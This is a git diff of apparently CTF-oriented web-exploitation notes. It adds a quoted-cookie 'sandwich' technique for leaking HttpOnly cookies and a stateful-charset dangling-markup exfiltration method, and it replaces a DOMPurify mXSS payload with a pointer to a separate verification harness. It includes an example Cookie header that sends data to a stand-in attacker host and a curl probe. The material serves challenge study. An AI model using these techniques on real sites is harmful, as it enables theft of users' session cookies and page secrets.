@@ -76,6 +76,47 @@ window.location = "http://127.0.0.1:7001/status";
 Note: `document.cookie` works even with `connect-src 'none'` CSP (it's not a network request).
 Navigation (`window.location`) is also NOT blocked by CSP.
 
+## Quoted-Cookie Sandwich via Lenient Server Parsing
+
+**Pattern:** two same-name cookies are sent around a sensitive HttpOnly cookie, and the server-side cookie parser accepts a quoted value that continues across semicolon-separated cookie pairs.
+
+Conceptually:
+
+```text
+Cookie: banner="<img src='https://attacker.invalid/?d=; auth=SENSITIVE; banner='>"
+```
+
+If the framework/parser treats the first quote as opening one quoted cookie value and scans forward to the later matching quote, the parsed value of `banner` may absorb the intervening `auth=...` material.
+
+This becomes useful when:
+
+- same-origin JavaScript can create the opening/closing same-name cookies;
+- cookie paths cause both attacker cookies and the HttpOnly cookie to be sent on the same request;
+- the application reflects the parsed cookie value into HTML without escaping;
+- an allowed navigation/image/form channel can carry the reflected bytes outward.
+
+Do **not** assume this parser behavior from RFC theory alone. Reproduce it directly with a synthetic `Cookie:` header against the exact framework/version before building the browser chain.
+
+A minimal validation shape:
+
+```bash
+curl -sS -H 'Cookie: banner="<img src=TEST?d=; auth=SENTINEL; banner=>"' \
+  https://target.invalid/status
+```
+
+The success predicate is not "the request was accepted"; it is that the rendered/parsing output actually contains the sentinel inside the value derived from the first cookie.
+
+Cookie ordering matters. Record:
+
+- cookie name;
+- path;
+- creation order;
+- HttpOnly/SameSite/Secure flags;
+- exact raw `Cookie:` header emitted by the browser;
+- which duplicate value the framework returns.
+
+This is a parser-differential primitive, not a generic guarantee about duplicate cookies.
+
 ## Dangling Markup Injection via Cookies
 
 When a cookie value is rendered with `| safe` (Jinja2) or without escaping:
@@ -99,21 +140,40 @@ The browser sends a request to `attacker.com/exfil?d=</p>%0A...FLAG{secret_value
 - `img-src http: https:` — dangling img tag works ✓
 - `default-src 'none'` without img-src — blocked ✗
 
-## DOMPurify 3.3.1 mXSS (CVE-2025-26791)
+## Charset-Driven Dangling-Markup Exfiltration
 
-Affects DOMPurify < 3.3.3. Namespace confusion with math/table/mglyph:
+A legacy/non-default character encoding can change how later page bytes are interpreted after attacker-controlled markup sets or influences the document charset.
 
-```html
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror="PAYLOAD">
+One reusable shape is:
+
+```text
+attacker-controlled reflected HTML
+  -> early <meta charset=...>
+  -> open image/URL attribute
+  -> encoding-state escape sequence
+  -> later sensitive page bytes become part of the URL
+  -> browser requests attacker-controlled endpoint
 ```
 
-DOMPurify sees `<img>` inside `<style>` (text content, safe).
-After innerHTML re-parse: `<img onerror>` becomes a real DOM element.
+ISO-2022-JP is especially interesting because it is stateful: escape sequences switch between character sets. In a controlled CTF page, an attacker may use a charset switch plus a later byte sequence that returns to ASCII so otherwise-special HTML bytes are consumed as URL data.
 
-**Limitations:**
-- Creates `<img onerror>` which IS blocked by `script-src 'nonce-...'` CSP
-- Useful on pages with `script-src 'unsafe-inline'` only
-- innerHTML-inserted `<script>` tags do NOT execute in any modern browser
+Treat this as **exact-parser/browser behavior**:
+
+1. confirm the browser accepts the declared charset at that document position;
+2. reproduce the byte stream locally with the target browser version;
+3. log the final requested URL exactly;
+4. verify CSP allows the chosen resource type;
+5. verify any pre-existing reflected cookie/value does not win duplicate-cookie ordering;
+6. do not assume the technique survives UTF-8 defaults, CSP, sanitizer rewriting, or modern browser changes.
+
+Keep the exploit proof at the byte/URL level. The important reusable lesson is the stateful-charset parser transition, not one challenge-specific escape sequence or flag.
+
+
+## DOMPurify / mXSS Claims
+
+Do not treat a version number plus a historical mXSS payload as proof of exploitability. Sanitizer behavior depends on the exact DOMPurify version, configuration, parser/browser version, and the page CSP.
+
+Use [dompurify-3.3.1-mxss-verification.md](dompurify-3.3.1-mxss-verification.md) for the empirical harness and current version-specific findings. If a sanitizer bypass survives but the resulting event handler/script is blocked by nonce-based CSP, the chain is still dead.
 
 ## Flask/Werkzeug Quirks
 
@@ -150,4 +210,8 @@ Browsers share cookies across ports on the same host:
 | HttpOnly cookie can't be overwritten | Cookie jar overflow (180+ cookies evicts oldest) |
 | nonce CSP blocks inline scripts | Find endpoint WITHOUT nonce (API sink) |
 | Custom header required for API | Use page's own JS that already sends it (queue page) |
-| DOMPurify sanitization | CVE-2025-26791 mXSS (< 3.3.3) |
+| DOMPurify sanitization | reproduce an exact-version/config/browser bypass; see `dompurify-3.3.1-mxss-verification.md` |
+
+## Provenance
+
+Quoted-cookie parsing, stateful-charset exfiltration, and exact-browser verification lessons were generalized from a June 2026 admin-bot CTF investigation. Challenge-specific hosts, ports, instance identifiers, local paths, credentials, and flag values are intentionally omitted. Historical raw notes remain recoverable from Git history.
